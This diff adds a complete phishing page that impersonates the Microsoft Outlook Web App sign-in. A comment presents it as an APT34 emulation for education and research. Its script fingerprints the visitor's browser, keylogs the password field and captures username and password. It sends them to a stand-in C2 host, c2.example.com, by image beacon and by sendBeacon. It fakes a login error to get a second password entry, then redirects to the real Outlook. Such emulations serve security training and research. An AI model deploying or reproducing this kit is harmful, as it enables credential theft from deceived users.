@@ -1,0 +1,371 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Outlook Web App</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Arial, sans-serif;
+            background: #f4f4f4;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .header {
+            background: #0078d4;
+            padding: 10px 30px;
+            display: flex;
+            align-items: center;
+        }
+
+        .header img {
+            height: 24px;
+            margin-right: 8px;
+        }
+
+        .header-title {
+            color: white;
+            font-size: 18px;
+            font-weight: 600;
+        }
+
+        .main {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+
+        .login-card {
+            background: white;
+            width: 440px;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .login-header {
+            padding: 44px 44px 20px;
+        }
+
+        .login-header h1 {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 12px;
+        }
+
+        .login-header p {
+            font-size: 13px;
+            color: #666;
+            line-height: 1.4;
+        }
+
+        .login-form {
+            padding: 0 44px 44px;
+        }
+
+        .form-group {
+            margin-bottom: 16px;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 13px;
+            color: #333;
+            margin-bottom: 4px;
+            font-weight: 600;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 6px 10px;
+            font-size: 15px;
+            border: 1px solid #666;
+            outline: none;
+            font-family: inherit;
+        }
+
+        .form-group input:focus {
+            border-color: #0078d4;
+            border-width: 2px;
+            padding: 5px 9px;
+        }
+
+        .form-options {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            margin-bottom: 20px;
+        }
+
+        .form-options input[type="checkbox"] {
+            width: 16px;
+            height: 16px;
+        }
+
+        .form-options label {
+            font-size: 13px;
+            color: #333;
+            cursor: pointer;
+        }
+
+        .btn-signin {
+            width: 100%;
+            background: #0078d4;
+            color: white;
+            border: none;
+            padding: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .btn-signin:hover {
+            background: #006bc1;
+        }
+
+        .btn-signin:disabled {
+            background: #ccc;
+            cursor: not-allowed;
+        }
+
+        .form-links {
+            margin-top: 16px;
+        }
+
+        .form-links a {
+            font-size: 13px;
+            color: #0078d4;
+            text-decoration: none;
+            display: block;
+            margin-bottom: 4px;
+        }
+
+        .form-links a:hover {
+            text-decoration: underline;
+        }
+
+        .error-msg {
+            display: none;
+            background: #fde7e9;
+            border-left: 3px solid #d13438;
+            padding: 8px 12px;
+            margin-bottom: 16px;
+            font-size: 13px;
+            color: #a80000;
+        }
+
+        .footer {
+            text-align: center;
+            padding: 16px;
+            color: #999;
+            font-size: 11px;
+        }
+
+        .security-badge {
+            display: flex;
+            align-items: center;
+            gap: 4px;
+            font-size: 11px;
+            color: #107c10;
+            margin-top: 16px;
+        }
+
+        .security-badge svg {
+            width: 14px;
+            height: 14px;
+            fill: #107c10;
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 20px;
+        }
+
+        .spinner {
+            width: 24px;
+            height: 24px;
+            border: 3px solid #e0e0e0;
+            border-top: 3px solid #0078d4;
+            border-radius: 50%;
+            animation: spin 0.8s linear infinite;
+            margin: 0 auto 8px;
+        }
+
+        @keyframes spin {
+            to {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <!-- Helix Kitten (APT34) - OWA Credential Phishing Page
+         Mimics Microsoft Outlook Web App login for credential harvesting
+         MITRE ATT&CK: T1566.003 (Spearphishing via Service), T1056.003 (Web Portal Capture)
+         FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY -->
+
+    <div class="header">
+        <svg height="24" viewBox="0 0 108 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+            <text x="0" y="18" font-family="Segoe UI, sans-serif" font-size="18" font-weight="600"
+                fill="white">Microsoft</text>
+        </svg>
+    </div>
+
+    <div class="main">
+        <div class="login-card">
+            <div class="login-header">
+                <h1>Sign in</h1>
+                <p>Use your organizational account</p>
+            </div>
+
+            <div class="login-form">
+                <div class="error-msg" id="errorMsg">
+                    <strong>Error:</strong> The user name or password you entered is not valid. Try entering it again.
+                </div>
+
+                <form id="loginForm" onsubmit="return handleSubmit(event)">
+                    <div class="form-group">
+                        <label for="username">Username</label>
+                        <input type="text" id="username" name="username" placeholder="someone@example.com"
+                            autocomplete="username" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label for="password">Password</label>
+                        <input type="password" id="password" name="password" placeholder=""
+                            autocomplete="current-password" required>
+                    </div>
+
+                    <div class="form-options">
+                        <input type="checkbox" id="lightMode" name="lightMode">
+                        <label for="lightMode">Use the light version of Outlook Web App</label>
+                    </div>
+
+                    <button type="submit" class="btn-signin" id="signInBtn">Sign in</button>
+
+                    <div class="form-links">
+                        <a href="#">Can't access your account?</a>
+                        <a href="#">Use another account to sign in</a>
+                    </div>
+
+                    <div class="security-badge">
+                        <svg viewBox="0 0 16 16">
+                            <path d="M8 1L2 4v3c0 4.4 2.6 8.5 6 9.5 3.4-1 6-5.1 6-9.5V4L8 1z" />
+                        </svg>
+                        <span>Protected by Microsoft Advanced Threat Protection</span>
+                    </div>
+                </form>
+
+                <div class="loading" id="loadingIndicator">
+                    <div class="spinner"></div>
+                    <p>Signing in...</p>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="footer">
+        &copy; 2024 Microsoft Corporation. All rights reserved.
+        &nbsp;|&nbsp; <a href="#" style="color:#666;font-size:11px;">Privacy</a>
+        &nbsp;|&nbsp; <a href="#" style="color:#666;font-size:11px;">Legal</a>
+    </div>
+
+    <script>
+        // credential harvesting JavaScript
+        var attempts = 0;
+        var maxAttempts = 2;
+        var keyLog = [];
+
+        // fingerprint collection
+        var fingerprint = {
+            userAgent: navigator.userAgent,
+            language: navigator.language,
+            platform: navigator.platform,
+            screen: screen.width + 'x' + screen.height,
+            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            colorDepth: screen.colorDepth,
+            touchPoints: navigator.maxTouchPoints,
+            plugins: Array.from(navigator.plugins || []).map(function (p) { return p.name; }).slice(0, 5),
+            cookieEnabled: navigator.cookieEnabled,
+            doNotTrack: navigator.doNotTrack,
+            connection: (navigator.connection || {}).effectiveType || 'unknown',
+            timestamp: new Date().toISOString()
+        };
+
+        // keylogger for password field
+        document.getElementById('password').addEventListener('keydown', function (e) {
+            keyLog.push({
+                key: e.key === 'Backspace' ? '[BS]' : (e.key.length === 1 ? e.key : '[' + e.key + ']'),
+                ts: Date.now()
+            });
+        });
+
+        function handleSubmit(e) {
+            e.preventDefault();
+            attempts++;
+
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // harvest credentials
+            var harvested = {
+                username: username,
+                password: password,
+                attempt: attempts,
+                keystrokes: keyLog,
+                fingerprint: fingerprint,
+                referrer: document.referrer,
+                url: window.location.href
+            };
+
+            // exfiltration method 1: image beacon
+            var beacon = new Image();
+            var params = btoa(JSON.stringify(harvested));
+            beacon.src = 'https://c2.example.com/pixel.gif?d=' + encodeURIComponent(params);
+
+            // exfiltration method 2: sendBeacon
+            if (navigator.sendBeacon) {
+                navigator.sendBeacon(
+                    'https://c2.example.com/collect',
+                    new Blob([JSON.stringify(harvested)], { type: 'text/plain' })
+                );
+            }
+
+            // show loading
+            document.getElementById('loginForm').style.display = 'none';
+            document.getElementById('loadingIndicator').style.display = 'block';
+
+            setTimeout(function () {
+                document.getElementById('loadingIndicator').style.display = 'none';
+                document.getElementById('loginForm').style.display = 'block';
+
+                if (attempts < maxAttempts) {
+                    // show error, request re-entry (catches corrections/alt passwords)
+                    document.getElementById('errorMsg').style.display = 'block';
+                    document.getElementById('password').value = '';
+                    document.getElementById('password').focus();
+                    keyLog = [];
+                } else {
+                    // redirect to real OWA after harvesting
+                    window.location.href = 'https://outlook.office365.com/owa/';
+                }
+            }, 2500);
+
+            return false;
+        }
+    </script>
+</body>
+
+</html>
